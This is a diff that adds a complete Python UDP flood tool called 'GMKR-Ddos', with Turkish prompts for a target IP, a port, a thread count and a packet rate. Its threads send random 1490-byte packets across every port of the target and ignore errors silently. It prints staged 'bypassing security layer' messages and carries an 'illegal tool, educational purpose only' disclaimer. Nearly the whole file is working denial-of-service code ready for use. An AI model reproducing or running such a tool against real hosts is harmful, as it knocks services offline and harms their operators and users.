@@ -1,0 +1,116 @@
+#!/usr/bin/env python3
+print("\033[92m")
+import sys
+import os
+import time
+import socket
+import random
+import threading
+from datetime import datetime
+
+# Code Time
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes_data = random._urandom(1490)
+#############
+
+os.system("clear" if os.name == "posix" else "cls")
+# Figlet olmayabilir, alternatif yazdırma
+print("=" * 40)
+print("      GMKR-Ddos")
+print("=" * 40)
+print()
+print("Coded By : GAMKERS")
+print("Author   : GAMKERS")
+print("Github   : github.com/gamkers")
+print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions")
+print()
+ip = input("IP Target : ")
+port = int(input("Port       : "))
+threads = int(input("Thread sayisi (Onereilen: 100-300) : "))
+packets_per_second = int(input("Saniyedeki paket sayisi (0 sinirsiz, 100-1000 arasi): "))
+
+os.system("clear" if os.name == "posix" else "cls")
+print("=" * 40)
+print("      GMKR-Ddos")
+print("=" * 40)
+print("Team : GAMKERS")
+print("\033[92m")
+print("________________TRYING TO REACH THE SERVER_____________________")
+time.sleep(2)
+print("_________________ESTABLISHING CONNECTION_______________________")
+time.sleep(2)
+print("_________0100100 BYPASSING SECURITY LAYER 001010_______________")
+time.sleep(2)
+print("_________________CONNECTION ESTABLISHED________________________")
+time.sleep(2)
+print("    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
+time.sleep(2)
+
+sent = 0
+running = True
+lock = threading.Lock()
+
+def send_packets():
+    global sent, running
+    local_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    current_port = port
+    
+    while running:
+        try:
+            local_sock.sendto(bytes_data, (ip, current_port))
+            with lock:
+                sent += 1
+            current_port += 1
+            if current_port > 65534:
+                current_port = 1
+                
+            # Paket hizini sinirlandir
+            if packets_per_second > 0:
+                time.sleep(1.0 / packets_per_second)
+                
+        except Exception as e:
+            # Hata olursa sessizce devam et
+            pass
+
+def print_stats():
+    global sent, running
+    start_time = time.time()
+    
+    while running:
+        time.sleep(1)
+        with lock:
+            current_sent = sent
+        elapsed = time.time() - start_time
+        packets_per_sec = current_sent / elapsed if elapsed > 0 else 0
+        
+        print("\r[+] Toplam gonderilen: {} paket | Hiz: {:.2f} paket/saniye".format(current_sent, packets_per_sec), end="")
+        sys.stdout.flush()
+
+print("\n[+] {} thread baslatiliyor...".format(threads))
+# Thread'leri baslat
+for i in range(threads):
+    thread = threading.Thread(target=send_packets)
+    thread.daemon = True
+    thread.start()
+
+# Istatistik thread'i
+stats_thread = threading.Thread(target=print_stats)
+stats_thread.daemon = True
+stats_thread.start()
+
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    running = False
+    print("\n\n[!] DDOS Attack durduruldu.")
+    with lock:
+        print("[+] Toplam gonderilen paket: {}".format(sent))
